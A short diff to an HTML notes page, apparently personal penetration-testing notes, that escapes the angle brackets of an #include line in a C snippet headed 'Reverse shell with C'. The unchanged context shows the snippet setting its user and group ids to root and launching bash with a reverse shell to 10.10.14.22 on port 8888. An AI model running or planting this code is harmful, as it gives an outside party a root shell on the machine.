@@ -231,7 +231,7 @@
             <div class="notion-body">
                 <ul>
                     <h2>Reverse shell with C</h2>
-                    <pre><code class="language-c">#include <unistd.h>
+                    <pre><code class="language-c">#include &lt;unistd.h&gt;
 int main() {
     setuid(0); setgid(0);
     execl("/bin/bash", "bash", "-c", "bash -i >& /dev/tcp/10.10.14.22/8888 0>&1", NULL);
